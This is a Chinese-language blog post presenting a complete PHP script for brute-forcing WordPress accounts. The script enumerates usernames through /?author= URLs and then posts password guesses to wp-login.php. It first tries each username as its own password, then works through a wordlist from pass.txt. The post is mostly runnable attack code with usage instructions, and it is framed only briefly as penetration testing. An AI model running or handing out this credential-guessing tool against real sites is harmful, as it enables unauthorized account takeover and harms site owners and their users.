# 跑wordpress用户密码脚本

在做渗透测试的时候，有时候会遇到一个wordpress博客，如果版本比较新，插件也没有漏洞的话，可以爆破用户名密码来尝试下。

大脑混沌情况下写的，有bug欢迎提出，由于是php的所以跑起来比较慢，下次发包还是调用命令结合hydra来爆破。

原理是通过URL`/?author=`遍历获取用户名，然后先跑用户名与密码相同的用户，再调用同目录下pass.txt中的密码文件进行爆破。

默认获取前10个用户，可自行修改。

使用方法：

```
php wordpress.php http://www.test.com

``````
<?php

set_time_limit(0); 
$domain = $argv[1];

//获取用户名
for ($i=1; $i <= 10; $i++) {

    $url = $domain."/?author=".$i;
    $response = httprequest($url,0);
    if ($response == 404) {
        continue;
    }
    $pattern = "/author\/(.*)\/feed/";
    preg_match($pattern, $response, $name);
    $namearray[] = $name[1];
}

echo "共获取用户".count($namearray)."名用户\n";

echo "正在破解用户名与密码相同的用户：\n";

$crackname = crackpassword($namearray,"same");

$passwords = file("pass.txt");

echo "正在破解弱口令用户：\n";

if ($crackname) {
    $namearray = array_diff($namearray,$crackname);
}

crackpassword($namearray,$passwords);

function crackpassword($namearray,$passwords){
    global $domain;
    $crackname = "";
    foreach ($namearray as $name) {
        $url = $domain."/wp-login.php";
        if ($passwords == "same") {
            $post = "log=".urlencode($name)."&pwd=".urlencode($name)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
            $pos = strpos(httprequest($url,$post),'div id="login_error"');
            if ($pos === false) {
                echo "$name $name"."\n";
                $crackname[] = $name;
            }
        }else{
            foreach ($passwords as $pass) {
                $post = "log=".urlencode($name)."&pwd=".urlencode($pass)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
                $pos = strpos(httprequest($url,$post),'div id="login_error"');
                if ($pos === false) {
                    echo "$name $pass"."\n";
                }
            }
        }
    }
    return $crackname;
}


function httprequest($url,$post){
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, "$url"); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);

    if($post){
        curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }

    $output = curl_exec($ch); 
    $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);


    if ($httpcode == 404) {
        return 404;
    }else{
        return $output;
    }
}
?>
```